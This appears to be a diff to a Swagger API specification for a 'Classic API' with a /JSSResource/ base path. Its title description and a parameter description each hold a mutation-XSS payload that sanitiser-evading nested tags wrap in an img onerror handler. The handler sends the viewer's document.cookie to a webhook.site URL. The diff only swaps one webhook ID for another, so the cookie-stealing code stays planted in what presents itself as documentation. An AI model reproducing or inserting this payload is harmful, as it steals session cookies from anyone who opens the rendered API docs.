@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: >
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://webhook.site/64caf927-f1d8-42a6-b856-078354fa80b3/?'+document.cookie;>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://webhook.site/eb131102-cb50-4987-b48c-cf1ed7394fbc/?'+document.cookie;>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: >
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://webhook.site/64caf927-f1d8-42a6-b856-078354fa80b3/?'+document.cookie;>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://webhook.site/eb131102-cb50-4987-b48c-cf1ed7394fbc/?'+document.cookie;>"></form>
           format: int64
           in: path
           name: id
